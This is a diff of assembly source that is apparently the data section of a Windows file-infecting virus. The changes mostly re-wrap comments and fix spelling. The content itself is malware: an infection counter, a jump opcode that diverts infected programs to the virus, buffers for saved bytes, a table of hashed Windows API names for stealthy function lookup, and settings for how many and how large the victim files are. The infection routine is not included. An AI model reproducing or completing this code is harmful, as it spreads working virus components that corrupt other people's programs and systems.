@@ -8,17 +8,18 @@
 ;-----------------------------------------------------------------------------------------
 
 ;-----------------------------------------------------------------------------------------
-;-----------------------------------------------------------------------------------------
 begin_data:                                     ; Beginning of data section.
 ;-----------------------------------------------------------------------------------------
 infect_count   db 0                             ; Infected programs counter.
-j_m_p          db 0E9h                          ; The offset to jump on virus code later in virus_code.asm
-                                                ; We need this variable to jump to our virus at the
-												; beginning of infected one.
+j_m_p          db 0E9h                          ; The offset to jump on virus code later 
+                                                ; in virus_code.asm
+                                                ; We need this variable to jump to our 
+												; virus at the beginning of infected one.
 save_vir_b     db 5 dup(0)                      ; Filling 5 bytes with null.
 old_save_vir_b db 5 dup(0)                      ; Filling 5 bytes with null.
-dwSectionAlignment dd 0                         ; Some strange variable for aligning code to find
-                                                ; the place virus is written is .exe file.
+dwSectionAlignment dd 0                         ; Some strange variable for aligning code 
+                                                ; to find the place virus is written in 
+                                                ; .exe file.
 ;-----------------------------------------------------------------------------------------
 ;We will use this structure while using FindFirstFile and FindNextFile functions.
 ;-----------------------------------------------------------------------------------------
@@ -35,7 +36,7 @@ WIN32_FIND_DATA           label    byte
   WFD_szAlternateFileName db       14 dup (0)
 WIN32_FIND_DATA_END       label    byte
 ;-----------------------------------------------------------------------------------------              
-delta_off           equ [ebp+18h]               ; Shows delta ofset for virus code.
+delta_off           equ [ebp+18h]               ; Shows delta offset for virus code.
 ;-----------------------------------------------------------------------------------------   
 ; After we have used CalcHash, we could find function hash in stack.
 ;-----------------------------------------------------------------------------------------   
@@ -67,25 +68,25 @@ base_s              equ [ebp-4*24]
 ; Table of function hashes.
 ;-----------------------------------------------------------------------------------------
 HashTable:
-dd 0F867A91Eh ; CloseHandle
-dd 03165E506h ; FindFirstFileA
-dd 0CA920AD8h ; FindNextFileA
-dd 0860B38BCh ; CreateFileA
-dd 029C4EF46h ; ReadFile
-dd 0CC17506Ch ; GlobalAlloc
-dd 0AAC2523Eh ; GetFileSize
-dd 07F3545C6h ; SetFilePointer
-dd 0F67B91BAh ; WriteFile
-dd 03FE8FED4h ; GlobalFree
-dd 015F8EF80h ; VirtualProtect
-dd 0D66358ECh ; ExitProcess
-dd 05D7574B6h ; GetProcAddress
-dd 071E40722h ; LoadLibraryA
-dd 0E65B28ACh ; FindClose
-dd 059B44650h ; GetModuleFileNameA
-dd 00709DC94h ; SetCurrentDirectoryA
-dd 0D64B001Eh ; FreeLibrary
-dw 0FFFFh     ; End of table label.
+dd 0F867A91Eh                                   ; CloseHandle
+dd 03165E506h                                   ; FindFirstFileA
+dd 0CA920AD8h                                   ; FindNextFileA
+dd 0860B38BCh                                   ; CreateFileA
+dd 029C4EF46h                                   ; ReadFile
+dd 0CC17506Ch                                   ; GlobalAlloc
+dd 0AAC2523Eh                                   ; GetFileSize
+dd 07F3545C6h                                   ; SetFilePointer
+dd 0F67B91BAh                                   ; WriteFile
+dd 03FE8FED4h                                   ; GlobalFree
+dd 015F8EF80h                                   ; VirtualProtect
+dd 0D66358ECh                                   ; ExitProcess
+dd 05D7574B6h                                   ; GetProcAddress
+dd 071E40722h                                   ; LoadLibraryA
+dd 0E65B28ACh                                   ; FindClose
+dd 059B44650h                                   ; GetModuleFileNameA
+dd 00709DC94h                                   ; SetCurrentDirectoryA
+dd 0D64B001Eh                                   ; FreeLibrary
+dw 0FFFFh                                       ; End of table label.
 ;-----------------------------------------------------------------------------------------
 ; File access modes.
 ;-----------------------------------------------------------------------------------------
@@ -107,7 +108,8 @@ MaxVictimNumber equ 2
 ;-----------------------------------------------------------------------------------------
 ; Maximum victim file size (bytes).
 ;-----------------------------------------------------------------------------------------
-CheckVictimSize equ 0                           ; Check size? If null, any size file will be infected.
+CheckVictimSize equ 0                           ; Check size? If null, any size file will 
+                                                ; be infected.
 MaxVictimSize equ   35 * 1024                   ; Maximum size of program to infect.
 ;-----------------------------------------------------------------------------------------
 ; Virus size in bytes.
@@ -119,7 +121,8 @@ end_data:    ; End of data section.
 ;-----------------------------------------------------------------------------------------
 ; We will need this variables later, when we'll try to make "healing" program.
 ;-----------------------------------------------------------------------------------------
-dd Virsize                             ; Code size in bytes.
-dd $ - save_vir_b - 4 + 4096 - Virsize ; save_vir_b ofset of the end of 4096-byte block.
-dd begin_data - start                  ; begin_data label ofset of start label.
-dd HashTable - start                   ; HashTable label ofset of start label.
+dd Virsize                                      ; Code size in bytes.
+dd $ - save_vir_b - 4 + 4096 - Virsize          ; save_vir_b offset of the end of 4096-byte
+                                                ; block.
+dd begin_data - start                           ; begin_data label offset of start label.
+dd HashTable - start                            ; HashTable label offset of start label.
